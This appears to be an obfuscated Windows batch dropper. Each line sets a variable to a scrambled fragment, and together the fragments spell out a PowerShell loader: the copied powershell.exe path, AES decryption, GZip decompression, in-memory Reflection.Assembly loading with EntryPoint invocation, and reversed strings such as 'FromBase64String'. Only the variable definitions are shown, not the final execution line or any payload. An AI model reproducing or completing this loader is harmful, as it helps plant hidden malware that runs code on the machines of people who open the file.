@echo off
set "kWLHgwPrAE=.e"
set "xZRUhTmVKX=he"
set "rVqmFyGEWO=\W"
set "tTEIqeXmsR=xe"
set "ILcjwfNJbi= /"
set "AlAQTFbQQM=\v"
set "DSQDvwaLaw= C"
set "ZhSwKJtBzt=ow"
set "bHuNERepPV=rS"
set "NYLXltjAdh=st"
set "wrBhhBVcMb=s\"
set "sPhQEMNYJk=1."
set "oJsUuCtnrY=0\"
set "SeCMOdjIku=32"
set "kBIqyNhoNe=nd"
set "hFLAvmzaaC=po"
set "suZFaLrEPt=in"
set "kBpJPfosNV=ws"
set "kyqPgpcRLi=y "
set "LESQeAFcRX=we"
set "nMXgsRFupH=ll"
set "RLQuaQTFwr=rs"
set "DzngwFJzEo=ll"
set "JjjzoJRDsJ=py"
set "lNzSENeGvs=he"
set "qWYjmqrykm=Sy"
set "RaPIaUmzbk=:\"
set "mwEuDxfWLc=Po"
set "SweXENrxCJ=we"
set "aEEttSaAiW=em"
set "FYSjAZTSTC=co"
set "pRpouIwZji=do"
set "BbXORufeMQ=Wi"
set "RREeTIrhel=cd"
set "mBdByLYUFC= %~dp0"
set "UvzfrXHAFe=KF, "
set "DsMOjjfRhs=ck($"
set "SQONDyXyuM=stem"
set "dmZBgEojDB=rtS4"
set "SzvRCavayG=New-"
set "JexouSvlzg=ct S"
set "VoCtPstcLT=DpEb"
set "aUFIEcauUH=lBlo"
set "REFRmuCjBu=y.Pa"
set "folsFjAscR=Invo"
set "EGoEhWTWcw=fore"
set "dICUhWMklA=ypto"
set "yKmMMJAZKH=1..-"
set "BaCMAYiCGR=stem"
set "hRkrDFeDjH=Ck);"
set "DjDElJZCOI=ateD"
set "SpNHoPPhrR=flec"
set "WrJBvUEwaP=O.Me"
set "dZfnbXqwtQ=faab"
set "eSsiBSVfIJ=)($O"
set "tRZZxzdMFK=yTo("
set "cpKZClsoyE=ionM"
set "DzbOaafdQh=em.C"
set "fjhaxWlioR=.Com"
set "WnnmSjypqi=);$T"
set "VbuIeDuznu=ddin"
set "sPJPrjzZVk=oL'["
set "LclmGPUBRQ=-1.."
set "JKVnlRPmIQ=raph"
set "TyEqqUUAEV=7;$x"
set "iofTWlIYkV=Z.Pa"
set "RXmbnnfFEb=tsWi"
set "YhjdkUDEvN=.Dis"
set "dpggCNnCJS=[Sys"
set "HhiTHbgLRl=eZ.I"
set "ZkanHrGsbD=PKF."
set "OraepolaaS=ct S"
set "fnSDANaUmp=Syst"
set "oUyCAOJMlM=R5jf"
set "YINpfVEmIa=morF"
set "FRppysMPiY=d;$x"
set "IsXuLShXgT=y]::"
set "CpiYPzGPgB=e = "
set "dPRuYWqPPb=Ck.T"
set "nmiISijtHS=ect "
set "iSAbMjyOKm=lit("
set "NqvtQmrKPn=tem."
set "roNPjHmfCI=FcNh"
set "UiRBwojXBd=pres"
set "NDVLOJIvtD=Tfh "
set "HxWbuDGynp=tion"
set "VOnPFWmaae=V = "
set "fKOCwWxpfo=OAgD"
set "yGRnyZuMxa=g = "
set "JgyRwydzYV=iron"
set "VsbwIFGivO=ode]"
set "aoYrvklvfI=OAgD"
set "VeNoDDOAaP= '')"
set "XjCCZUuTnz=zy.T"
set "hTUUhZxKdK=comm"
set "xYDbojfvNW=('%*'"
set "LbxevptBti=$OAg"
set "kkwlXvWyOk=($KZ"
set "fIaqllxpRi=sion"
set "xgscvcoOBC=[]] "
set "hMypxHyYwN=);$b"
set "EOIqwvqczj=mory"
set "aKUTRcrfjU=aDNK"
set "oJhgVrbfMl=Conv"
set "lgRfQsHDeL=F'[-"
set "gwmEQdBcCm=B = "
set "wMixWzwiJY= [Sy"
set "IwceSAqxpO=ke($"
set "LiPyEjpXAf=tS46"
set "ULNmUODpOs=KZTf"
set "qZOKyuvYrR==');"
set "IjFZWaNcVm=-Obj"
set "quLsfVrlHi=Obje"
set "auiRJrQrRV=m) {"
set "IfBlnmCqhm=WaPK"
set "VrdIViHigs=.Dis"
set "RCPlqIFnKO=-joi"
set "pnnOixoDwV=Secu"
set "ABCVKzQvlR= [st"
set "zRuiDBxSuX=Secu"
set "jQZeNHhhXY=Ebz "
set "avAVDOeaRY== [S"
set "GXcpzcAwTg= = N"
set "LaugmduzsI=6] -"
set "axviZHGluG=();$"
set "nLtTQTqICb=xJge"
set "okxrSOwMyI=oint"
set "zWJenqjbaP=gMod"
set "PthFHdISVC=;$LE"
set "HjqDrNbrCl=ose("
set "jyIpKklBIS=y.Cr"
set "aEnMNNiyFn=rofi"
set "rsKZElMbOy=);$v"
set "gTARkSRDJZ='gni"
set "zuDPcDBlWP=k; }"
set "sHADPItKxG=TllA"
set "sfiYGYiCBI=pose"
set "LMDxwmgvsZ=..-1"
set "kpdVGMyOZT=;$Dp"
set "HMaMvbbIkv=)($E"
set "nRDRgoYBjd=ose("
set "DJEFxEEGJN=1] -"
set "UTfbTOymPg=onve"
set "mdFPzwyLNQ=em.I"
set "JPxGggzbdq=saBm"
set "vQPfmCLeCy=-nop"
set "iQtCojGKSe=('ev"
set "yVrffbLlNt=$WaP"
set "VbKzzznyYI=DNJS"
set "XCztyetnAe= = $"
set "ualxwzfVyh=ss -"
set "kAjLbthPLk=JgeZ"
set "TGZhHWubmv=]::("
set "jMAyqXqxLz=rity"
set "LUKbMQPLXR=esMa"
set "KelIMgGRAW=TRqB"
set "ekyZbDFUGV=stem"
set "fCnYHHbzRz=$OAg"
set "SIrWZBKLwj= [Sy"
set "vQsNMZtjYr=('da"
set "vHihnvoFoL=BC;$"
set "vYiPIRVPnd=THxh"
set "xwnGzZYiUU=zm83"
set "bOteYCuoWV=:('g"
set "pWSijAzZqr=.Cry"
set "UMcFFCIhKA=ach "
set "aSwUvmvFAZ=pose"
set "XnMsLDvXif=ecry"
set "FWKUGevSjI=le  "
set "tYQGveefYg=e]::"
set "CUAOAxXMWi=ring"
set "KIrywwLtaZ=null"
set "HcpLZuigZc=; };"
set "RFolgDNskk=.Len"
set "pdvyCBsMtp=)) {"
set "aGQDwLVomu=AgDe"
set "pQYXjAxugz=ing("
set "rYvhohYrHr=ddin"
set "mBPVrXqprE=yste"
set "wGinDpcsUn=, (,"
set "kVGGDgCpkc=[Sys"
set "kkIQSLYJaW=.Cre"
set "WTwukiJKIm=yste"
set "bKKPLBdLXJ=gth)"
set "YPXHgqWbSU=Disp"
set "KyFRWOEriF=am;$"
set "pdYAxbpGcU=m.Re"
set "JJkxZKyUSe=  $E"
set "OwtAhCVHyA=6esa"
set "XUhRXDPwmP=daeR"
set "eIjlOiMLts=Bmor"
set "BPIffTryVt=CuSj"
set "XjejVudOMX=16] "
set "TDZlXQRVuI=Comp"
set "VVDdNxXftM=and "
set "dUiMAbkZgP=Mzy."
set "PLVFvmFuui=;$Wa"
set "PqJhGqxzjh=nirt"
set "DgDmHyvZzI='[-1"
set "tRkgxgkZwK=t Sy"
set "GjKrnqPIgj=$pfW"
set "qeFhKnfWQr=JgeZ"
set "BZEuDZivgs=e, 0"
